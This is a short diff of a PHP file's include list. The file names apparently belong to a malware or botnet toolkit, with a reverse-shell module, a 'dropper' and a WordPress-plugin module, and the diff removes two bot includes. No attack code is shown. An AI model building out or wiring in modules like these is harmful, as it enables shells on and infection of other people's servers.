@@ -8,9 +8,6 @@ include "lib/curlStuff/defaultClient/genericClientValidateHosts.php";
 include "lib/curlStuff/defaultClient/genericClientExecuteReverseShell.php";
 include "lib/curlStuff/validateMeMore/talkToMeDamnit.php";
 include "lib/curlStuff/mainCurl.php";
-//bots
-include "lib/bots/bot_esplode/mustRetreat.php";
-include "lib/bots/bot_files/hereEatThis.php";
 // make new bots
 include "lib/new_bots/makeMeSlim/slimDropper.php";
 include "lib/new_bots/wordpressPlugins/makeMeWordPressing.php";
